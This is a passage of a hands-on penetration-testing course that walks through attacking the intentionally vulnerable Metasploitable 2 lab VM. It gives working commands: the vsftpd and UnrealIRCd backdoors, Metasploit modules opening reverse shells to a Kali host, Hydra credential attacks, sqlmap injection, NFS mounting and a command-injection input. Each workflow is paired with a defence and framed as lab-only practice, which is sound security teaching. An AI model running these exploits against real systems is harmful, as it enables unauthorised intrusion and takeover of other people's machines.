Replace the example IP with your real target IP. **Next move:** Use `$MS2` in every later command. ### Step 5: Set attacker variable **Command:** ```bash export KALI=192.168.56.102 ``` **What this does:** Stores your attacker IP for reverse connections. **What to look for:** Replace it with your Kali IP. **Next move:** Use `$KALI` for Metasploit `LHOST`. ### Step 6: Verify connectivity **Command:** ```bash ping -c 4 $MS2 ``` **What this does:** Checks whether the target responds to ICMP. **What to look for:** Replies from the t

title: Workflow 2: Full Nmap scan and service map
text: **Goal:** Build the real attack surface inventory before touching exploits. **Before you start:** `$MS2` must be set. ### Step 1: Quick ping scan **Command:** ```bash nmap -sn $MS2 ``` **What this does:** Checks whether the target appears alive to Nmap. **What to look for:** Host up/down result. **Next move:** If down, verify VM networking first. ### Step 2: Top-port scan **Command:** ```bash nmap -sS --top-ports 100 -sV $MS2 ``` **What this does:** SYN-scans common ports and fingerprints service versions. **What to look for:** Open ports like 21, 22, 23, 25, 80, 139, 445, 3306, 5900, 6667, 8180. **Next move:** Use this for a fast first video/demo. ### Step 3: Full TCP scan **Command:** ```bash sudo nmap -sS -sV -sC -O -p- -T4 -oA ms2_full $MS2 ``` **What this does:** Scans every TCP port, fingerprints services, runs default scripts, detects OS, and saves output. **What to look for:** A long list of open ports and service versions. **Next move:** Review `ms2_full.nmap` and build a service table. ### Step 4: Read saved scan **Command:** ```bash less ms2_full.nmap ``` **What this does:** Opens the main Nmap report. **What to look for:** Port, state, service, version, host scripts. **Next move:** Prioritize old, exposed, or admin services. ### Step 5: UDP scan **Command:** ```bash sudo nmap -sU --top-ports 100 -sV -oA ms2_udp $MS2 ``` **What this does:** Checks the top UDP services. **What to look for:** Mostly fewer results than TCP. **Next move:** Document any open UDP services instead of ignoring them. ### Step 6: Extract open ports **Command:** ```bash grep '^ *[0-9].*open' ms2_full.nmap ``` **What this does:** Prints only open service lines. **What to look for:** The actual target service list. **Next move:** Map each service to an enumeration workflow. **Evidence to

title: Workflow 3: FTP service enumeration and vsftpd backdoor
text: **Goal:** Identify `vsftpd 2.3.4`, trigger the known lab backdoor, and prove command execution. **Before you start:** Port 21 must show `vsftpd 2.3.4` or similar. ### Step 1: Grab FTP banner **Command:** ```bash nc -nv $MS2 21 ``` **What this does:** Connects to FTP and displays the service banner. **What to look for:** `vsftpd 2.3.4` banner. **Next move:** If the version matches, continue to the known exploit path. ### Step 2: Run FTP NSE checks **Command:** ```bash nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $MS2 ``` **What this does:** Checks anonymous login, bounce behavior, and FTP system info. **What to look for:** Anonymous status and system details. **Next move:** Document misconfig even before exploitation. ### Step 3: Search local exploit database **Command:** ```bash searchsploit vsftpd 2.3.4 ``` **What this does:** Finds public exploit references for the detected version. **What to look for:** Backdoor exploit entries. **Next move:** Use Metasploit or manual proof. ### Step 4: Trigger backdoor manually **Command:** ```bash nc -nv $MS2 21 USER hacker:) PASS anything ``` **What this does:** The vulnerable FTP daemon opens a backdoor listener after the crafted username. **What to look for:** Connection may hang or close; that can still mean the trigger worked. **Next move:** Connect to port 6200. ### Step 5: Test backdoor port **Command:** ```bash nc -nv $MS2 6200 id ``` **What this does:** Connects to the opened bind shell and runs `id`. **What to look for:** UID/GID output from the target. **Next move:** This proves remote command execution. ### Step 6: Metasploit alternative **Command:** ```bash msfconsole -q use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 192.168.56.101 run ``` **What this does:** Automates the same backdoor trigger through Metasplo

title: Workflow 4: Direct bind shell on port 1524
text: **Goal:** Show why an unexplained listening shell is critical exposure. **Before you start:** Port 1524 must be open in Nmap. ### Step 1: Confirm open port **Command:** ```bash nmap -p1524 -sV $MS2 ``` **What this does:** Fingerprints the direct shell listener. **What to look for:** Open port with generic/bind shell service info. **Next move:** Connect manually. ### Step 2: Connect to shell **Command:** ```bash nc -nv $MS2 1524 ``` **What this does:** Opens a direct TCP connection to the shell. **What to look for:** A shell prompt or immediate command execution. **Next move:** Run harmless identity commands. ### Step 3: Prove context **Command:** ```bash id whoami hostname ``` **What this does:** Shows which user the exposed shell runs as. **What to look for:** UID, username, hostname. **Next move:** Record privilege level and cleanup. ### Step 4: Check listener locally **Command:** ```bash ss -tulpn | grep 1524 ``` **What this does:** On the target, shows which process owns the listener. **What to look for:** The process/service responsible. **Next move:** Map exposure to a fix. **Evidence to capture:** Open port, shell connection, `id`/`hostname` output. **Defense to teach:** Remove bind shells; monitor listeners and firewall inbound services.

title: Workflow 5: SSH and Telnet password auditing
text: **Goal:** Test whether lab accounts have weak/default credentials and explain the plaintext Telnet risk. **Before you start:** Use only Metasploitable's own lab accounts. ### Step 1: Create user list **Command:** ```bash cat > ms2-users.txt <<'EOF' msfadmin user postgres service sys klog EOF ``` **What this does:** Creates a small lab-only username list. **What to look for:** Six candidate local users. **Next move:** Create a matching password list. ### Step 2: Create password list **Command:** ```bash cat > ms2-passwords.txt <<'EOF' msfadmin user postgres service batman 123456789 EOF ``` **What this does:** Creates a small lab-only password list. **What to look for:** Known/likely MS2 defaults. **Next move:** Run a controlled password audit. ### Step 3: Audit SSH **Command:** ```bash hydra -L ms2-users.txt -P ms2-passwords.txt -t 4 -f ssh://$MS2 ``` **What this does:** Tests the small username/password list against SSH at low speed. **What to look for:** A successful login pair if weak credentials exist. **Next move:** Log in manually and capture proof. ### Step 4: Manual SSH proof **Command:** ```bash ssh msfadmin@$MS2 ``` **What this does:** Logs in with the lab account. **What to look for:** Password prompt and shell after `msfadmin` password. **Next move:** Run `id` and `hostname`. ### Step 5: Audit Telnet **Command:** ```bash hydra -L ms2-users.txt -P ms2-passwords.txt -t 4 -f telnet://$MS2 ``` **What this does:** Tests the same lab credentials against Telnet. **What to look for:** Successful lab login if exposed. **Next move:** Show why plaintext access is worse. ### Step 6: Capture Telnet traffic **Command:** ```bash sudo tcpdump -i eth0 host $MS2 and port 23 -A ``` **What this does:** Displays TCP payloads for the Telnet session. **What to look for:** Readable

title: Workflow 6: SMTP user enumeration
text: **Goal:** Test whether SMTP reveals valid usernames. **Before you start:** SMTP on port 25 must be reachable. ### Step 1: Connect manually **Command:** ```bash nc -nv $MS2 25 ``` **What this does:** Opens an SMTP session. **What to look for:** SMTP banner. **Next move:** Issue safe verification commands. ### Step 2: Check known lab users **Command:** ```bash VRFY msfadmin VRFY root QUIT ``` **What this does:** Asks SMTP whether accounts exist. **What to look for:** Different responses for valid/invalid names. **Next move:** Compare outputs and document. ### Step 3: Run Nmap SMTP scripts **Command:** ```bash nmap -p25 --script smtp-commands,smtp-enum-users $MS2 ``` **What this does:** Enumerates supported SMTP commands and users. **What to look for:** Supported commands and possible account names. **Next move:** Feed confirmed users into authorized account testing. ### Step 4: Use dedicated enum tool **Command:** ```bash smtp-user-enum -M VRFY -U ms2-users.txt -t $MS2 ``` **What this does:** Automates VRFY-based account checks. **What to look for:** Confirmed user list. **Next move:** Stop after enumeration; do not send spam. **Evidence to capture:** SMTP banner, VRFY responses, enum output. **Defense to teach:** Disable VRFY/EXPN where possible, normalize responses, monitor enumeration.

title: Workflow 7: RPC and NFS exposure
text: **Goal:** Check whether the VM exports filesystem paths that should not be accessible. **Before you start:** NFS/rpcbind must be present. ### Step 1: List RPC services **Command:** ```bash rpcinfo -p $MS2 ``` **What this does:** Shows registered RPC services and ports. **What to look for:** NFS, mountd, portmapper entries. **Next move:** Use `showmount` next. ### Step 2: List exports **Command:** ```bash showmount -e $MS2 ``` **What this does:** Displays NFS directories exported by the target. **What to look for:** Paths such as `/` or shared folders. **Next move:** Mount only your lab export. ### Step 3: Create mount point **Command:** ```bash sudo mkdir -p /mnt/ms2 ``` **What this does:** Creates a local directory for the remote filesystem. **What to look for:** Directory exists. **Next move:** Mount the NFS export. ### Step 4: Mount export **Command:** ```bash sudo mount -t nfs $MS2:/ /mnt/ms2 ``` **What this does:** Mounts the exported filesystem from the VM. **What to look for:** No error on success. **Next move:** Inspect without grabbing sensitive files. ### Step 5: Create harmless marker **Command:** ```bash sudo touch /mnt/ms2/tmp/ms2-lab-marker.txt ls -l /mnt/ms2/tmp/ms2-lab-marker.txt ``` **What this does:** Proves whether write access is possible. **What to look for:** Marker file appears in the export. **Next move:** Unmount and report write exposure. ### Step 6: Unmount cleanly **Command:** ```bash sudo umount /mnt/ms2 ``` **What this does:** Disconnects the remote filesystem. **What to look for:** No mount remains. **Next move:** Document export policy and fix. **Evidence to capture:** RPC service list, export list, mounted directory, marker proof. **Defense to teach:** Restrict exports, use proper NFS permissions, firewall NFS ports.

title: Workflow 8: SMB enumeration and Samba usermap
text: **Goal:** Enumerate Samba shares/users, then use the known lab usermap path for command execution. **Before you start:** Ports 139/445 should show Samba. ### Step 1: List shares anonymously **Command:** ```bash smbclient -L //$MS2 -N ``` **What this does:** Queries SMB share list without credentials. **What to look for:** Shares, workgroup, server info. **Next move:** Check share access with `smbmap`. ### Step 2: Map share permissions **Command:** ```bash smbmap -H $MS2 ``` **What this does:** Shows readable/writable shares and permissions. **What to look for:** Anonymous read/write or sensitive shares. **Next move:** Document share exposure. ### Step 3: Full SMB enum **Command:** ```bash enum4linux-ng -A $MS2 ``` **What this does:** Collects users, groups, shares, policy, and OS info. **What to look for:** User names, shares, password policy. **Next move:** Use findings for targeted testing. ### Step 4: SMB scripts **Command:** ```bash nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $MS2 ``` **What this does:** Uses Nmap to confirm OS, shares, and users. **What to look for:** Samba/OS details and share/user lists. **Next move:** Move to the Samba exploit module. ### Step 5: Open Metasploit **Command:** ```bash msfconsole -q ``` **What this does:** Starts Metasploit. **What to look for:** Metasploit prompt. **Next move:** Select Samba usermap module. ### Step 6: Run Samba module **Command:** ```bash use exploit/multi/samba/usermap_script set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4444 run ``` **What this does:** Sends the lab exploit and opens a reverse command shell. **What to look for:** A session or shell connecting back to Kali. **Next move:** Run identity commands. ### Step 7: Prove shell

title: Workflow 9: HTTP recon and content discovery
text: **Goal:** Map the web attack surface before choosing web attacks. **Before you start:** Port 80 should be open with Apache. ### Step 1: Fetch headers **Command:** ```bash curl -I http://$MS2/ ``` **What this does:** Shows HTTP status and response headers. **What to look for:** Server header, status code, content type. **Next move:** Fetch homepage content. ### Step 2: Fetch homepage **Command:** ```bash curl http://$MS2/ | head -n 40 ``` **What this does:** Shows the beginning of the HTML response. **What to look for:** Links, app names, comments, technology hints. **Next move:** Check known paths next. ### Step 3: Run Nikto **Command:** ```bash nikto -h http://$MS2 ``` **What this does:** Finds common web server misconfigurations and files. **What to look for:** Interesting paths, headers, outdated components. **Next move:** Manually verify findings. ### Step 4: Run dirb **Command:** ```bash dirb http://$MS2 /usr/share/wordlists/dirb/common.txt ``` **What this does:** Brute-forces common directories/files. **What to look for:** Found paths like `/phpinfo.php`, `/dav`, `/phpMyAdmin`, `/dvwa`, `/mutillidae`. **Next move:** Probe confirmed paths. ### Step 5: Run Gobuster **Command:** ```bash gobuster dir -u http://$MS2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html ``` **What this does:** Fast route/file discovery with extensions. **What to look for:** Status codes and discovered resources. **Next move:** Build a sitemap. ### Step 6: Check phpinfo **Command:** ```bash curl http://$MS2/phpinfo.php | head -n 30 ``` **What this does:** Reveals PHP configuration if exposed. **What to look for:** PHP version, modules, paths, environment details. **Next move:** Explain why info disclosure matters. ### Step 7: Check app paths **Command:** ```bash for p in mutillidae dvw

title: Workflow 10: WebDAV write access
text: **Goal:** Prove whether the web server allows unauthenticated file upload through DAV. **Before you start:** `/dav/` or another DAV route exists. ### Step 1: Check DAV route **Command:** ```bash curl -I http://$MS2/dav/ ``` **What this does:** Checks whether DAV responds. **What to look for:** HTTP response status and authentication prompt if any. **Next move:** If accessible, use DAV client. ### Step 2: Create marker file **Command:** ```bash echo 'CYBER-AI LAB MARKER' > lab-marker.txt ``` **What this does:** Creates a harmless upload proof. **What to look for:** Local file exists. **Next move:** Upload the marker only. ### Step 3: Open DAV client **Command:** ```bash cadaver http://$MS2/dav/ ``` **What this does:** Starts a command-line WebDAV session. **What to look for:** DAV prompt. **Next move:** Upload and list the marker file. ### Step 4: Upload marker **Command:** ```bash put lab-marker.txt ls quit ``` **What this does:** Uploads a harmless file and lists the remote directory. **What to look for:** Marker appears remotely. **Next move:** Fetch it over HTTP. ### Step 5: Verify upload **Command:** ```bash curl http://$MS2/dav/lab-marker.txt ``` **What this does:** Downloads the marker through the web server. **What to look for:** Marker content returned. **Next move:** This proves unauthenticated write access. **Evidence to capture:** Marker file, DAV listing, HTTP fetch proof. **Defense to teach:** Disable DAV or require auth/least-privilege writes; monitor uploads.

title: Workflow 11: Mutillidae SQL injection workflow
text: **Goal:** Test the intentionally vulnerable Mutillidae app for database injection. **Before you start:** Burp/ZAP or sqlmap; Mutillidae path must respond. ### Step 1: Check Mutillidae **Command:** ```bash curl -I http://$MS2/mutillidae/ ``` **What this does:** Confirms the app exists. **What to look for:** HTTP 200/302 response. **Next move:** Open in browser. ### Step 2: Map forms with proxy **Command:** ```bash python3 - <<'PY' print('Open Burp/ZAP and browse http://' + '$MS2' + '/mutillidae/') PY ``` **What this does:** Reminder step: proxy the browser before testing. **What to look for:** Requests appear in Burp/ZAP history. **Next move:** Pick the login/search form. ### Step 3: Run sqlmap forms mode **Command:** ```bash sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --level=2 --risk=1 --current-db ``` **What this does:** Detects forms and tests injection parameters in a lab app. **What to look for:** Current database name if vulnerable. **Next move:** Keep proof limited; do not dump data. ### Step 4: Optional DB banner **Command:** ```bash sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --banner ``` **What this does:** Shows DBMS banner/version through the vulnerable app. **What to look for:** Database version/banner. **Next move:** Document impact and fix. ### Step 5: Capture app log evidence **Command:** ```bash curl -I http://$MS2/mutillidae/ && sudo tail -n 30 /var/log/apache2/access.log ``` **What this does:** Shows the request and Apache access evidence if you run it on the target. **What to look for:** Relevant requests in logs. **Next move:** Use logs to explain defender visibility. **Evidence to capture:** sqlmap output, vulnerable request, DB proof, Apache log. **Defense to teach:** Parameterized qu

title: Workflow 12: DVWA setup and guided attacks
text: **Goal:** Use DVWA for clean web attack demos: SQLi, command injection, XSS, and file inclusion. **Before you start:** DVWA must be installed inside your MS2 build. ### Step 1: Check DVWA **Command:** ```bash curl -I http://$MS2/dvwa/ ``` **What this does:** Confirms DVWA responds. **What to look for:** HTTP response and redirect/setup page. **Next move:** Open setup in browser. ### Step 2: Open setup **Command:** ```bash echo 'Open http://'$MS2'/dvwa/setup.php in your browser' ``` **What this does:** Prints the setup URL. **What to look for:** DVWA setup screen. **Next move:** Create/reset the lab database. ### Step 3: Login reminder **Command:** ```bash echo 'Default lab login: admin / password' ``` **What this does:** Provides the standard lab credentials. **What to look for:** DVWA login page. **Next move:** Login and set security to Low. ### Step 4: Prepare SQLi URL **Command:** ```bash echo "http://$MS2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" ``` **What this does:** Shows the SQL Injection challenge endpoint. **What to look for:** The `id` parameter and submit button. **Next move:** Capture cookie/session before sqlmap. ### Step 5: Run sqlmap with cookie **Command:** ```bash sqlmap -u "http://$MS2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<YOUR_SESSION>; security=low" --batch --current-db ``` **What this does:** Tests the authenticated DVWA SQLi page. **What to look for:** Current DB name or injection confirmation. **Next move:** Keep proof limited. ### Step 6: Command injection proof **Command:** ```bash echo 'DVWA command injection lab input: 127.0.0.1; id' ``` **What this does:** Shows a harmless command-injection proof input. **What to look for:** Browser should show `id` output if vulnerable. **Next move:** Explain shell metach

title: Workflow 13: Tomcat manager and WAR upload
text: **Goal:** Test weak Tomcat manager access and understand why manager apps are high risk. **Before you start:** Tomcat on `8180` must be reachable. ### Step 1: Fingerprint Tomcat **Command:** ```bash curl -I http://$MS2:8180/ nmap -p8180 -sV $MS2 ``` **What this does:** Checks HTTP headers and Tomcat service version. **What to look for:** Tomcat/Coyote service details. **Next move:** Check manager endpoint. ### Step 2: Check manager **Command:** ```bash curl -I http://$MS2:8180/manager/html ``` **What this does:** Checks whether Tomcat Manager responds. **What to look for:** 401/auth prompt or accessible page. **Next move:** Try lab/default credentials in browser only. ### Step 3: Try lab credentials **Command:** ```bash echo 'Try only lab defaults: tomcat/tomcat or admin/admin' ``` **What this does:** Keeps credential testing to known MS2 defaults. **What to look for:** Manager login page. **Next move:** If access succeeds, document the weak credential issue. ### Step 4: Open Metasploit **Command:** ```bash msfconsole -q ``` **What this does:** Starts Metasploit. **What to look for:** MSF prompt. **Next move:** Select Tomcat manager module. ### Step 5: Run manager upload module **Command:** ```bash use exploit/multi/http/tomcat_mgr_upload set RHOSTS 192.168.56.101 set RPORT 8180 set HttpUsername tomcat set HttpPassword tomcat set PAYLOAD linux/x86/meterpreter/reverse_tcp set LHOST 192.168.56.102 set LPORT 4447 run ``` **What this does:** Uploads a controlled app through manager access and opens a session if vulnerable. **What to look for:** Meterpreter session or failed auth/module result. **Next move:** Inspect the session. ### Step 6: Prove session **Command:** ```bash sysinfo getuid shell id ``` **What this does:** Shows system and user context from Meterpreter. **Wh

title: Workflow 14: Database weak access: MySQL and PostgreSQL
text: **Goal:** Test whether database services accept weak/default remote access. **Before you start:** Ports 3306 and/or 5432 open. ### Step 1: Fingerprint MySQL **Command:** ```bash nmap -p3306 --script mysql-info,mysql-empty-password $MS2 ``` **What this does:** Collects MySQL info and checks empty password conditions. **What to look for:** Version, accounts, empty-password findings. **Next move:** Try lab root login. ### Step 2: Test MySQL login **Command:** ```bash mysql -h $MS2 -u root -p ``` **What this does:** Starts MySQL client login. **What to look for:** Password prompt; try empty password only in lab. **Next move:** If logged in, run safe metadata queries. ### Step 3: Safe MySQL proof **Command:** ```bash SHOW DATABASES; SELECT user, host FROM mysql.user; ``` **What this does:** Shows accessible databases and account hosts. **What to look for:** Database list/user host permissions. **Next move:** Do not dump table contents. ### Step 4: Fingerprint PostgreSQL **Command:** ```bash nmap -p5432 -sV $MS2 ``` **What this does:** Fingerprints PostgreSQL service. **What to look for:** Version/service details. **Next move:** Try lab credential. ### Step 5: Test PostgreSQL login **Command:** ```bash psql "host=$MS2 user=postgres password=postgres" ``` **What this does:** Attempts lab `postgres/postgres` login. **What to look for:** `psql` prompt if successful. **Next move:** Run safe metadata commands. ### Step 6: Safe PostgreSQL proof **Command:** ```bash \l \du \conninfo ``` **What this does:** Lists databases, roles, and connection context. **What to look for:** Accessible databases/roles. **Next move:** Exit and document exposure. **Evidence to capture:** DB version, successful login, database list, user/role metadata. **Defense to teach:** Strong credentials, bind loc

title: Workflow 15: VNC and X11 remote access exposure
text: **Goal:** Show why remote display services need authentication and network restriction. **Before you start:** Ports 5900 and/or 6000 open. ### Step 1: Fingerprint VNC **Command:** ```bash nmap -p5900 --script vnc-info $MS2 ``` **What this does:** Collects VNC protocol/security info. **What to look for:** Supported protocol and auth types. **Next move:** Try VNC client. ### Step 2: Test VNC **Command:** ```bash vncviewer $MS2:5900 ``` **What this does:** Connects to the remote display. **What to look for:** Password prompt or desktop access. **Next move:** Try lab password `password` only. ### Step 3: Fingerprint X11 **Command:** ```bash nmap -p6000 --script x11-access $MS2 ``` **What this does:** Checks whether the X display is accessible. **What to look for:** Open/denied access result. **Next move:** If open, use a harmless screenshot tool. ### Step 4: Capture X11 screenshot **Command:** ```bash xwd -root -silent -display $MS2:0 -out ms2-screen.xwd ``` **What this does:** Captures the remote X display if open. **What to look for:** A screenshot file. **Next move:** Document visual privacy exposure. **Evidence to capture:** VNC login/desktop proof, X11 access result, screenshot file. **Defense to teach:** Wrap remote display in SSH/VPN, strong auth, restrict ports.

title: Workflow 16: UnrealIRCd backdoor
text: **Goal:** Exploit the known vulnerable IRC daemon in a controlled lab. **Before you start:** Port 6667 should show UnrealIRCd. ### Step 1: Fingerprint IRC **Command:** ```bash nmap -p6667 -sV $MS2 nc -nv $MS2 6667 ``` **What this does:** Fingerprints the IRC daemon. **What to look for:** UnrealIRCd/version banner. **Next move:** Use the known backdoor module. ### Step 2: Search Metasploit **Command:** ```bash msfconsole -q search unreal ircd ``` **What this does:** Finds matching exploit modules. **What to look for:** UnrealIRCd backdoor module. **Next move:** Select it. ### Step 3: Run IRC module **Command:** ```bash use exploit/unix/irc/unreal_ircd_3281_backdoor set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4445 run ``` **What this does:** Triggers the IRC backdoor and opens a reverse command shell. **What to look for:** Session connected back to Kali. **Next move:** Run proof commands. ### Step 4: Prove shell **Command:** ```bash id hostname uname -a ``` **What this does:** Confirms remote execution. **What to look for:** UID and hostname. **Next move:** Record and close session. ### Step 5: Check alternate IRC **Command:** ```bash nmap -p6697 -sV $MS2 ``` **What this does:** Checks whether a second IRC listener exists. **What to look for:** Open/closed/filtered result. **Next move:** Include it in the service inventory. **Evidence to capture:** IRC banner, module result, `id` proof. **Defense to teach:** Upgrade/remove IRC service, restrict ports, alert on unusual outbound shells.

title: Workflow 17: distccd remote command execution
text: **Goal:** Test the exposed compiler service that can run commands. **Before you start:** Port 3632 open. ### Step 1: Fingerprint distccd **Command:** ```bash nmap -p3632 -sV $MS2 ``` **What this does:** Identifies the distccd service. **What to look for:** distccd version/banner. **Next move:** Run the NSE check. ### Step 2: Run NSE check **Command:** ```bash nmap -p3632 --script distcc-cve2004-2687 $MS2 ``` **What this does:** Checks for the known distcc command execution issue. **What to look for:** Vulnerable/not vulnerable output. **Next move:** Use Metasploit if confirmed. ### Step 3: Search module **Command:** ```bash msfconsole -q search distcc ``` **What this does:** Finds the distcc exploit module. **What to look for:** `distcc_exec` result. **Next move:** Use it. ### Step 4: Run distcc module **Command:** ```bash use exploit/unix/misc/distcc_exec set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4446 run ``` **What this does:** Sends a lab exploit request and opens a reverse shell if vulnerable. **What to look for:** Session created. **Next move:** Prove execution. ### Step 5: Prove shell **Command:** ```bash id hostname uname -a ``` **What this does:** Confirms command execution context. **What to look for:** UID/host/kernel. **Next move:** Save evidence and close session. **Evidence to capture:** Service banner, NSE result, session, `id`. **Defense to teach:** Remove/restrict distccd; isolate build infrastructure.

title: Workflow 18: Java RMI service exposure
text: **Goal:** Check the remote Java service for unsafe object/service exposure. **Before you start:** Port 1099 open. ### Step 1: Fingerprint Java RMI **Command:** ```bash nmap -p1099 -sV $MS2 ``` **What this does:** Fingerprints Java RMI registry. **What to look for:** Java/RMI service info. **Next move:** Run RMI NSE check. ### Step 2: Run RMI check **Command:** ```bash nmap -p1099 --script rmi-vuln-classloader $MS2 ``` **What this does:** Checks for known classloader exposure. **What to look for:** Vulnerable/not vulnerable result. **Next move:** Use Metasploit if supported. ### Step 3: Search Metasploit **Command:** ```bash msfconsole -q search java_rmi ``` **What this does:** Finds Java RMI modules. **What to look for:** Relevant exploit module. **Next move:** Select matching module. ### Step 4: Run Java RMI module **Command:** ```bash use exploit/multi/misc/java_rmi_server set RHOSTS 192.168.56.101 set PAYLOAD java/meterpreter/reverse_tcp set LHOST 192.168.56.102 set LPORT 4448 run ``` **What this does:** Attempts the lab RMI exploit path. **What to look for:** Meterpreter session or module failure. **Next move:** Record exact result. **Evidence to capture:** RMI service info, NSE result, Metasploit output/session. **Defense to teach:** Disable unnecessary RMI, patch Java, restrict service.

title: Workflow 19: Extra exposed services: ccProxy, AJP, DRb
text: **Goal:** Cover less-famous services so your course is not only the obvious exploits. **Before you start:** Ports 2121, 8009, and/or 8787 may appear depending on build. ### Step 1: Check alternate FTP **Command:** ```bash nmap -p2121 -sV $MS2 nc -nv $MS2 2121 ``` **What this does:** Fingerprints the secondary FTP/proxy service. **What to look for:** Service banner/version. **Next move:** Document anonymous/default access if present. ### Step 2: Try anonymous FTP **Command:** ```bash ftp $MS2 2121 ``` **What this does:** Attempts FTP login prompt. **What to look for:** Username prompt. **Next move:** Try `anonymous` only in your own lab. ### Step 3: Fingerprint AJP **Command:** ```bash nmap -p8009 -sV $MS2 ``` **What this does:** Checks the Tomcat AJP connector. **What to look for:** AJP/service details. **Next move:** Run AJP scripts. ### Step 4: Run AJP scripts **Command:** ```bash nmap -p8009 --script ajp-methods,ajp-headers,ajp-auth $MS2 ``` **What this does:** Enumerates connector behavior. **What to look for:** Supported methods/headers/auth exposure. **Next move:** Document whether AJP is unnecessarily exposed. ### Step 5: Fingerprint DRb **Command:** ```bash nmap -p8787 -sV --script druby-info $MS2 ``` **What this does:** Checks Ruby DRb service info. **What to look for:** DRb service/version details. **Next move:** Search Metasploit for matching DRb module. ### Step 6: Run DRb module if present **Command:** ```bash msfconsole -q search drb use exploit/linux/misc/drb_remote_codeexec set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4450 run ``` **What this does:** Attempts the Ruby DRb exploit path if your build exposes it. **What to look for:** Session or module failure. **Next move:** Record version-dependent resul

title: Workflow 20: Metasploit professional workflow
text: **Goal:** Use Metasploit like an assessment tool, not just a random exploit launcher. **Before you start:** Metasploit installed and `$MS2`/`$KALI` known. ### Step 1: Initialize DB **Command:** ```bash sudo msfdb init ``` **What this does:** Initializes the Metasploit PostgreSQL-backed database. **What to look for:** Database initialized/already initialized. **Next move:** Start `msfconsole`. ### Step 2: Start console **Command:** ```bash msfconsole -q ``` **What this does:** Opens Metasploit quietly. **What to look for:** `msf` prompt. **Next move:** Create workspace. ### Step 3: Create workspace **Command:** ```bash workspace -a ms2-course workspace ``` **What this does:** Creates and activates a named workspace. **What to look for:** `ms2-course` marked active. **Next move:** Store scan data. ### Step 4: Run DB scan **Command:** ```bash db_nmap -sS -sV -p- 192.168.56.101 ``` **What this does:** Runs Nmap through Metasploit and stores hosts/services. **What to look for:** Hosts/services stored in DB. **Next move:** Review `hosts` and `services`. ### Step 5: Review services **Command:** ```bash hosts services ``` **What this does:** Lists stored target hosts and services. **What to look for:** MS2 host and open ports. **Next move:** Search modules for services. ### Step 6: Search modules **Command:** ```bash search vsftpd search samba usermap search unreal ircd search distcc search tomcat manager ``` **What this does:** Finds modules matching detected services. **What to look for:** Module paths and rankings. **Next move:** Pick the module matching service/version. ### Step 7: Standard exploit pattern **Command:** ```bash use exploit/path/module info show options set RHOSTS 192.168.56.101 set PAYLOAD cmd/unix/reverse_netcat set LHOST 192.168.56.102 set LPORT 4444 run `

title: Workflow 21: Post-exploitation checks without credential theft
text: **Goal:** Show what an attacker sees after access while keeping the lesson clean. **Before you start:** You already have a shell/session on MS2. ### Step 1: Identify user **Command:** ```bash id whoami ``` **What this does:** Shows current account and privileges. **What to look for:** UID/GID and username. **Next move:** Determine whether you are user/service/root. ### Step 2: Identify host **Command:** ```bash hostname uname -a cat /etc/os-release ``` **What this does:** Shows hostname, kernel, and OS. **What to look for:** Metasploitable/Ubuntu details. **Next move:** Map version to likely weaknesses. ### Step 3: Network context **Command:** ```bash ip a ip route ss -tulpn ``` **What this does:** Shows interfaces, routes, and listening services. **What to look for:** IP, gateway, listeners, owning processes. **Next move:** Understand what the host can reach. ### Step 4: Processes **Command:** ```bash ps aux | head -n 40 ``` **What this does:** Shows running processes. **What to look for:** Web/db/irc/samba/other services. **Next move:** Correlate processes with exposed ports. ### Step 5: Privilege indicators **Command:** ```bash sudo -l find / -perm -4000 -type f 2>/dev/null | head -n 30 ``` **What this does:** Checks sudo rights and common SUID binaries. **What to look for:** Allowed commands or unusual SUID files. **Next move:** Treat findings as audit leads, not automatic exploitation. ### Step 6: Persistence locations **Command:** ```bash crontab -l ls -la /etc/cron* | head ls -la /etc/rc*.d | head ``` **What this does:** Shows where persistence might appear. **What to look for:** Scheduled tasks/startup scripts. **Next move:** Learn locations; do not install persistence. ### Step 7: Auth logs **Command:** ```bash sudo tail -n 100 /var/log/auth.log ``` **What this

title: Workflow 22: Defense validation and retest
text: **Goal:** Prove the fix or hardening step removes the attack path. **Before you start:** Finish each attack before moving to the next. ### Step 1: Record original proof **Command:** ```bash echo 'Save original banner/request/session/id evidence' ``` **What this does:** Reminds you to keep baseline evidence. **What to look for:** Original vulnerable proof. **Next move:** Apply a fix or compare to hardened clone. ### Step 2: Apply conceptual fix **Command:** ```bash echo 'Example: upgrade service, disable listener, require auth, firewall port' ``` **What this does:** Maps attack to defense. **What to look for:** A clear remediation statement. **Next move:** Retest the same path. ### Step 3: Retest port **Command:** ```bash nmap -p21,23,139,445,1524,3306,3632,5432,5900,6667,8180 $MS2 ``` **What this does:** Checks whether risky ports are still reachable. **What to look for:** Closed/filtered or still open services. **Next move:** Mark whether exposure changed. ### Step 4: Retest exploit **Command:** ```bash nc -nv $MS2 6200 ``` **What this does:** Checks whether the vulnerable backdoor listener still exists. **What to look for:** Connection refused/closed if fixed. **Next move:** Document retest result. ### Step 5: Write finding **Command:** ```bash cat > finding-template.txt <<'EOF' Title: Service: Evidence: Impact: Fix: Retest: EOF ``` **What this does:** Creates a small report template. **What to look for:** A template file for the finding. **Next move:** Fill it out for each attack path. **Evidence to capture:** Before/after output, retest result, report entry. **Defense to teach:** A fix is only real when the original attack path fails and logs show attempts.

title: Final Safety Rule
text: Metasploitable 2 is intentionally vulnerable. That makes it legal and useful for practice. It does not make random websites, routers, accounts, or followers legal targets.

title: I-1. Lab scope and variables
text: Create a controlled practice environment. - `export TARGET=192.168.56.101 export KALI=192.168.56.102` — Stores lab IPs once; replace with your real VM IPs. - `sudo arp-scan --localnet` — Finds live hosts on the isolated lab network. - `ping -c 4 $TARGET` — Confirms target reachability before scanning.

